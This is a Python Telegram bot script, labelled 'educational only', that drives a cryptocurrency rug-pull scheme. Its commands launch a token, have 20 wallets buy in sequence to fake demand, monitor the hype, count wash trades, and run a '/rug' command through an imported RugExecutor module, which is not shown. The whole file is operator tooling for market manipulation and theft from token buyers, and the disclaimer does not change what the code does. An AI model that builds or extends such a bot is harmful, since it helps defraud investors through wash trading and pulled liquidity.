#!/usr/bin/env python3
"""
Simple Rug Pull Bot - EDUCATIONAL ONLY
"""

import asyncio
import sys
import os

try:
    import telebot
    from config import TELEGRAM_TOKEN, RPC_URL
    from modules.bundler import RugBundler
    from modules.monitor import HypeMonitor
    from modules.rugger import RugExecutor
except ImportError as e:
    print(f"\n[ERROR] Import Error: {e}")
    print("\n[INFO] Install dependencies:")
    print("   pip install -r requirements.txt")
    sys.exit(1)
except ValueError as e:
    print(f"\n[ERROR] Configuration Error: {e}")
    print("\n[INFO] Setup Instructions:")
    print("1. Copy env.example to .env")
    print("2. Edit .env and add your credentials")
    print("3. Run: python setup_rpc.py")
    sys.exit(1)

bot = telebot.TeleBot(TELEGRAM_TOKEN)
bundler = RugBundler(RPC_URL)
monitor = HypeMonitor(RPC_URL)
rugger = RugExecutor(RPC_URL)

@bot.message_handler(commands=['start'])
def handle_start(message):
    """Start command."""
    bot.reply_to(message, "Rug Bot Ready! Commands:\n/launch <name> <symbol> <image>\n/monitor <mint>\n/rug <mint>")

@bot.message_handler(commands=['launch'])
def handle_launch(message):
    """Launch token with validation and auto-monitoring."""
    try:
        args = message.text.split()[1:]
        if len(args) < 3:
            bot.reply_to(message, "Usage: /launch <name> <symbol> <image_url>")
            return
        
        name, symbol, image_url = args[0], args[1], args[2]
        
        # Input validation
        if len(name) > 32:
            bot.reply_to(message, "[ERROR] Token name too long (max 32 chars)")
            return
        if len(symbol) > 10:
            bot.reply_to(message, "[ERROR] Symbol too long (max 10 chars)")
            return
        if not image_url.startswith('http'):
            bot.reply_to(message, "[ERROR] Invalid image URL (must start with http)")
            return
        
        bot.reply_to(message, f"[LAUNCH] Creating {name} ({symbol})...")
        bot.reply_to(message, f"[INFO] 20 wallets will buy sequentially")
        
        mint = asyncio.run(bundler.create_and_bundle(name, symbol, image_url))
        
        if mint:
            bot.reply_to(message, f"[OK] Token created: {mint[:16]}...")
            bot.reply_to(message, f"[MONITOR] Auto-monitoring enabled")
            
            # Auto-start monitoring (essential, not optional)
            try:
                asyncio.run(monitor.start(mint, message.chat.id))
            except Exception as monitor_error:
                bot.reply_to(message, f"[WARNING] Monitor failed: {monitor_error}")
        else:
            bot.reply_to(message, f"[ERROR] Launch failed")
            
    except ValueError as ve:
        bot.reply_to(message, f"[ERROR] Validation failed: {ve}")
    except Exception as e:
        bot.reply_to(message, f"[ERROR] Launch failed: {e}")
        import traceback
        print(f"[ERROR] Full trace: {traceback.format_exc()}")

@bot.message_handler(commands=['monitor'])
def handle_monitor(message):
    """Start monitoring."""
    try:
        args = message.text.split()[1:]
        if len(args) < 1:
            bot.reply_to(message, "Usage: /monitor <mint>")
            return
            
        mint = args[0]
        bot.reply_to(message, f"[MONITOR] Started monitoring {mint}")
        
    except Exception as e:
        bot.reply_to(message, f"Monitor failed: {e}")

@bot.message_handler(commands=['rug'])
def handle_rug(message):
    """Manual rug."""
    try:
        args = message.text.split()[1:]
        if len(args) < 1:
            bot.reply_to(message, "Usage: /rug <mint>")
            return
            
        mint = args[0]
        success = asyncio.run(rugger.execute(mint))
        
        if success:
            bot.reply_to(message, f"[RUG] RUGGED {mint}")
        else:
            bot.reply_to(message, f"[ERROR] Rug failed for {mint}")
            
    except Exception as e:
        bot.reply_to(message, f"Rug failed: {e}")

@bot.message_handler(commands=['status'])
def handle_status(message):
    """Get bot status."""
    try:
        status = monitor.get_status()
        bot.reply_to(message, f"Bot Status:\nActive tokens: {len(status['active_tokens'])}\nWash trades: {status['wash_count']}")
    except Exception as e:
        bot.reply_to(message, f"Status check failed: {e}")

if __name__ == "__main__":
    print("Simple Rug Bot Starting...")
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(f"Bot failed: {e}")
